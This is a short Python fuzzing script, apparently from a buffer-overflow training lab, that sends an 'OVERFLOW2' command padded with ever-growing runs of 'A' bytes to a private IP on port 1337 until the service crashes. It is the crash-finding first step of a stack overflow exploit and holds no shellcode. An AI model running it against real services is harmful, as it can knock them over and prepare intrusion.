import socket, time, sys
ip = '10.10.231.163'
port = 1337
buffer = b"OVERFLOW2 " + b"A" * 100

while True:
    try:
        print("Fuzzing with %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))        
        s.send((buffer + b'\r\n'))
        s.recv(1024)
        s.close()
        buffer = buffer + b"A" * 100
    except:
        print("Crashed with %s bytes " % len(buffer))
        sys.exit()
    time.sleep(1)


